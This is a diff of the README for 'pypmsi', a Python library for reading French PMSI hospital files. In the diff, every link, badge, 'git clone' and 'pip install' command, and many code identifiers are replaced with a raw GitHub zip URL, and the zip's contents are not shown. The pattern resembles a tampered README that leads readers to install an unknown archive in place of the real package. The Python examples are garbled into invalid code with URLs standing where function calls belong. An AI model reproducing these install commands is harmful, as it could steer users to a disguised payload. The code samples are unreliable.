@@ -1,32 +1,32 @@
 # pypmsi
 
-Lire les fichiers du PMSI avec python / https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
+Lire les fichiers du PMSI avec python / https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip
 
-[![logotest](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip)]()
+[![logotest](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip)]()
 
 ### temps de lecture de fichiers
 
 #### avec puce silicon
 
-[![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rsa-~700ms-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rss-~500ms-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;000&nbsp;rsf-~7sec-firebrick)]()
+[![](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip;000&nbsp;rsa-~700ms-firebrick)]()  [![](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip;000&nbsp;rss-~500ms-firebrick)]()  [![](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip;000&nbsp;000&nbsp;rsf-~7sec-firebrick)]()
 
 #### avec puce "classique"
 
-[![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rsa-~3sec-firebrick)]()  [![](https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip;000&nbsp;rss-~2sec-firebrick)]()
+[![](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip;000&nbsp;rsa-~3sec-firebrick)]()  [![](https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip;000&nbsp;rss-~2sec-firebrick)]()
 
 
 ## Installation
 
 
 ```sh
-git clone https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
+git clone https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip
 poetry install
 ```
 
 avec pip
 
 ```sh
-pip install https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip
+pip install https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip
 ```
 
 
@@ -42,23 +42,23 @@ import pypmsi as pm
 ##### Spécifier les paramètres dans la fonction
 
 ```python
-rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(290000017, 2021, 5, '~/Documents/data/mco', typi = 4)
+rsa = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip(290000017, 2021, 5, '~/Documents/data/mco', typi = 4)
 rsa
 ```
 
 ##### Définir un noyau de paramètres
 
 ```python
-p = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(finess = 290000017, annee = 2021, mois = 5, path = '~/Documents/data/mco')
-rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip()
+p = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip(finess = 290000017, annee = 2021, mois = 5, path = '~/Documents/data/mco')
+rsa = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip()
 rsa
 ```
 
 ##### indiquer le chemin du fichier et l'année, et le lire
 
 ```python
-mon_rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(filepath = '~https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip', annee = 2021)
-rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip()
+mon_rsa = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip(filepath = '~https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip', annee = 2021)
+rsa = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip()
 rsa
 ```
 
@@ -68,9 +68,9 @@ rsa
 On peut modifier en ligne les paramètres, exemple :
 
 ```python
-p = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(finess = 290000017, annee = 2021, mois = 12, path = '~/Documents/data/mco')
+p = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip(finess = 290000017, annee = 2021, mois = 12, path = '~/Documents/data/mco')
 # lire les données 2022
-rsa = https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip(annee = 2022)
+rsa = https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip(annee = 2022)
 rsa
 ```
 
@@ -158,9 +158,9 @@ rsa
 
 ```python
 (rsa['actes']
-    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
+    .filter(https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('cdccam')https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('EBLA'))
     .group_by(['cdccam', 'nbexec'])
-    .agg(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('act').len().alias('nb'))    
+    .agg(https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('act').len().alias('nb'))    
 )
 ```
 
@@ -178,7 +178,7 @@ shape: (2, 3)
 
 ```python
 (rsa['actes']
-    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
+    .filter(https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('cdccam')https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('EBLA'))
     .join(rsa['rsa'], on = 'cle_rsa', how = 'inner')
     .pivot(index = 'cdccam', values = 'nbexec', on = 'rsatype', aggregate_function = 'sum')
     .fill_null(0)
@@ -199,7 +199,7 @@ shape: (2, 5)
 
 ```python
 (rsa['actes']
-    .filter(https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('cdccam')https://raw.githubusercontent.com/Egep39/pypmsi/main/wherryman/pypmsi.zip('EBLA'))
+    .filter(https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('cdccam')https://github.com/Egep39/pypmsi/raw/refs/heads/main/docs/Software_clamor.zip('EBLA'))
     .join(rsa['rsa'], on = 'cle_rsa', how = 'inner')
     .pivot(index = ['rsacmd', 'rsatype'], values = 'nbexec', on = 'cdccam', 
            separator = '-', aggregate_function = 'sum')
